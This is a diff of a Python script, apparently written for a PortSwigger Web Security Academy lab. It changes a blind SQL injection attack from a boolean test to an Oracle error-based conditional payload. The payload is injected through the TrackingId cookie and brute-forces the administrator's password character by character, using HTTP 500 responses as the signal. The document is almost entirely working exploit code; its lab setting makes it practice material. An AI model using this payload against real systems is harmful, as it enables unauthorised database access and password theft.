@@ -1,11 +1,10 @@
 import requests 
 import string
 
-url = 'https://0a540046033d0e6b803d547a00ec00da.web-security-academy.net/'
-port = 8080
+url = 'https://0aa6008103f3c76680490889000100fd.web-security-academy.net/'
 cookie = {
-    "TrackingId": "n1JzsdUSWNcuMn4i", 
-    "session": "0VPXEFDteReEtqtZnXzbEdScvQP3iGYf"
+    "TrackingId": "34Gb1KL8IoMOnJdf",
+    "session": "2yEv3OXtAbh1QK3NzTu4cni0I6LqpK3Y"
 }
 
 allstring = string.ascii_lowercase + string.digits
@@ -19,16 +18,15 @@ print(response.status_code)
 for num in range(1,21):
     for a in allstring:
        payload= (
-           f"{track_id}'AND "
-           f"(SELECT SUBSTRING(password,{num},1) "
-           f"FROM users WHERE username='administrator')='{a}'--"
+            f"{track_id}'||(SELECT CASE WHEN SUBSTR(password,{num},1)='{a}' THEN TO_CHAR(1/0) ELSE'' END FROM users WHERE username='administrator')||'"
        )
        cookie = {
            "TrackingId": payload,
-           "session" : "0VPXEFDteReEtqtZnXzbEdScvQP3iGYf" 
+           "session" : "2yEv3OXtAbh1QK3NzTu4cni0I6LqpK3Y" 
        }
        response = client.get(url, cookies=cookie,timeout=10)
-       if "Welcome back" in response.text:
+       if response.status_code == 500:
            paswrd += a
+           print(f'найдет символ: {a}')
            break
 print(paswrd)
